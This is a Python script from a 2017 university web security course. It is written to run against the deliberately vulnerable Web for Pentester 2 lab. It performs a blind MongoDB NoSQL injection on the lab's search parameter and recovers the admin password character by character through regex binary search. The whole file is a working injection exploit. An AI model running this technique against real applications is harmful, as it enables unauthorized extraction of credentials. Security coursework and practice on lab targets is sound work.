# program1script.py
# Brandon Craig | bracraig "at" pdx "dot" edu | CS410: Web Security | Fall 2017 | Portland State University
# Program #1


# This program takes in a single argument from the command line, which is the IP or web-address
# of the Pentester 2 Lab. This program will not work with sites that are not the Web for Pentester 2 Lab.


from bs4 import BeautifulSoup
import sys
import requests


def validate_url(url) :
    """ validate_url
    Args:
        url (str) : The url to be validated.
    Returns:
        bool: Whether the url was valid (True), or invalid, or throws an exception (False).
    """
    session = requests.Session()
    try:
        resp = session.get(url)
        if resp.status_code == requests.codes.ok :
            return True
        else:
            print('Status code returned: ' + resp.status_code)
            return False
    except:
        print('Not a valid URL')
        return False



def generate_regex(min, max, alphabet):
    """ generate_regex
    Args:
        min (int): the index of the lower bound of the regex
        max (int): the index of the upper bound of the regex
        alphabet (str): the character array from which the regex's bounds will be selected
    Returns:
        str: the completed regular expression
    """
    return '[' + alphabet[min] + '-' + alphabet[max] + ']'



def parse_html_for_match(response_text):
    """ parse_html_for_math
    Args:
        response_text (str): this is the response from the WFP2 website and is then given to 
                             Beautiful soup to parse for the search term.
    Returns:
        bool: True if the term '?search=admin' is found in an 'href' field in the response_text
    """
    soup = BeautifulSoup(response_text, 'html.parser')
    for a in soup.find_all('a', href=True):
        if a['href'] == '?search=admin':
            #print ("Found the URL:", a['href'])
            return True
    #print('URL not Found:')    
    return False





def test_for_password(url) :
    """ test_for_password
    Args:
        url (str): the url (completed) to be "gotten" (GET) by the created Session. 
    Returns:
        bool: the_result of the parsing function, which is passed the response.text from the site. 
    """
    session = requests.Session()
    resp = session.get(url)
    return parse_html_for_match(resp.text)



def binary_search_attack(url_head, url_tail, min, max, regex_range, password):
    """ binary_search_attack
    Args:
        url_head (str): the url as it exists up to the where the regex goes.
        url_tail (str): the url after the regex is added on. 
        min (int): the lower bound of this recursive binary search.
        max (int): the upper bound of this recursive binary search. 
        regex_range(str): the characted set being tested (numbers, uppercase, or lowercase)
        password (str): the accumalated password so far based on the results of previous search attacks
                        to be added to the front of the regex as the program makes progress.
    Returns:
        str: the character that is the result of this search, either from the regex_range or the empty string. 
    """
    if min > max : return ''
    #print(regex_range[min : max + 1])
    regex = generate_regex(min, max, regex_range)
    #print(regex)
    url = url_head + password + regex + url_tail
    if test_for_password(url) :
        if min == max :
            return regex_range[min]
        else :
            mid = int((min + max)/2)
            #print(mid)
            left = binary_search_attack(url_head, url_tail, min, mid, regex_range, password)
            if left != '':
                return left
            return binary_search_attack(url_head, url_tail, mid + 1, max, regex_range, password)
    else :
        return ''
    return ''


def password_attack(url_head, url_tail) :
    """password_attack
    Args:
        url_head (str): the url as it exists up to the where the regex goes.
        url_tail (str): the url after the regex is added on. 
    Returns:
        string: the password.
    """
    lowercase = 'abcdefghijklmnopqrstuvwxyz'
    uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    numbers = '0123456789'

    password = ''
    done = False
    while(done == False) :
        result = binary_search_attack(url_head, url_tail, 0, 25, lowercase, password)
        if(result == '') :
            #print("not lowercase")
            result = binary_search_attack(url_head, url_tail, 0, 25, uppercase, password)
        if(result == '') :
            #print("not uppercase")
            result = binary_search_attack(url_head, url_tail, 0, 9, numbers, password)
        if(result == '') :
            if(password != '') :
                print('password found')
            else:
                print('something went wrong: is this the pentester website?')
            done = True
        else :
            password = password + result
    return password


def main() :
    """main
    Args: Just the one argument (the website) passed in. Which will be validated. A missing argument
          or too many arguments will be rejected.
    """
    argument_length = len(sys.argv)
    if argument_length < 2 :
        print('missing IP address or name of Web for Pentester site: halting program')
        sys.exit()
    if argument_length > 2 :
        print('unexpected arguments found: halting program')
        sys.exit()

    url_arg = 'http://' + sys.argv[1] + '/'
    if validate_url(url_arg):
        print(url_arg + ' validation successful.')
    else:
        print(url_arg + ' validation failed.')
        sys.exit()
    url_before_regex = url_arg + '/mongodb/example2/?search=admin\'%20%26%26%20this.password.match(/^' 
    url_after_regex = '/)//+%00'

    password = password_attack(url_before_regex, url_after_regex)
    if password != '':
        print(password)



#The body of the program.
main()
#End of the body of the program. LOL. 








